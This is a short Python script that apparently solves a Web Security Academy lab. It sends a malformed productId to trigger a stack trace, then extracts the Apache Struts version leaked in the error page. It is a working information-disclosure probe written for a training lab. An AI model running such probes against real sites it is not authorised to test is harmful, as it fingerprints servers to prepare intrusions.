import requests
import re

site = "0a49005104da728a81eae806001f0024.web-security-academy.net"
s = requests.Session()

# Step 1: Send a GET request with malformed productId to trigger exception
target_url = f"https://{site}/product?productId=invalid_id"
resp = s.get(target_url)

# Step 2: Print raw response to inspect
print("[*] Checking response for stack trace and version info...\n")
print(resp.text[:1500])  # You can increase limit if needed

# Step 3: Search for version info (example: "Apache Struts 2 2.3.31")
version_match = re.search(r'(Apache Struts 2 [\d.]+)', resp.text, re.IGNORECASE)

if version_match:
    print(f"[✓] Version Info Found: {version_match.group(1)}")
else:
    print("[!] Could not find version string in the response.")

# Step 4: Confirm lab completion
confirm = s.get(f"https://{site}/")
if "Congratulations" in confirm.text:
    print("[✓] Lab solved via malformed productId triggering stack trace.")
else:
    print("[!] Version visible, but lab not marked as solved. Submit manually if needed.")
